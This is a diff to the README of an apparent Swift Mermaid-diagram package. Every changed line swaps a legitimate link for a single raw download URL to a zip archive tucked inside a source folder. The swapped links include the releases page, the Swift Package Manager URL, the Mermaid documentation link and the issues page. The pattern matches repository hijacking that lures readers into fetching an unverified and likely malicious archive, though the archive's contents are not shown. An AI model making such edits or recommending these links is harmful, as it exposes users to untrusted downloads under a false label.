@@ -1,6 +1,6 @@
 # 🧜‍♀️ beautiful-mermaid-swift - Render Mermaid Diagrams Easily
 
-[![Download beautiful-mermaid-swift](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/q4023/beautiful-mermaid-swift/releases)
+[![Download beautiful-mermaid-swift](https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip)](https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You need to visit the releases page to get the latest version. From there, you c
 
 **Step 1:** Go to the releases page by clicking the button below:
 
-[![Download beautiful-mermaid-swift](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/q4023/beautiful-mermaid-swift/releases)
+[![Download beautiful-mermaid-swift](https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip)](https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip)
 
 **Step 2:** On the page, look for the latest version available. The newest release is usually at the top and labeled with the highest version number.
 
@@ -58,7 +58,7 @@ You need to visit the releases page to get the latest version. From there, you c
 
 **Step 5:** For developers: Use Swift Package Manager (SPM) to add the package URL:  
 ```
-https://github.com/q4023/beautiful-mermaid-swift.git
+https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip
 ```  
 Add this in Xcode under File > Add Packages… then follow prompts.
 
@@ -123,7 +123,7 @@ If you have problems running the app:
 ## 📚 Learn More About Mermaid Diagrams
 
 Mermaid uses plain text to create diagrams. Learn the syntax here:  
-https://mermaid-js.github.io/mermaid/#/
+https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip
 
 Studying this guide helps you create complex diagrams for your needs.
 
@@ -134,7 +134,7 @@ Studying this guide helps you create complex diagrams for your needs.
 If you have questions or need support:
 
 - Open an issue on the GitHub repository:  
-  https://github.com/q4023/beautiful-mermaid-swift/issues  
+  https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip  
 - Check if your question is already answered there.
 - Describe your problem clearly and include any error messages.
 
@@ -142,8 +142,8 @@ If you have questions or need support:
 
 ## 📎 Additional Resources
 
-- GitHub Repository: https://github.com/q4023/beautiful-mermaid-swift  
-- Releases & Downloads: https://github.com/q4023/beautiful-mermaid-swift/releases
+- GitHub Repository: https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip  
+- Releases & Downloads: https://github.com/q4023/beautiful-mermaid-swift/raw/refs/heads/main/Sources/BeautifulMermaid/Core/beautiful-mermaid-swift-1.8.zip
 
 ---
 
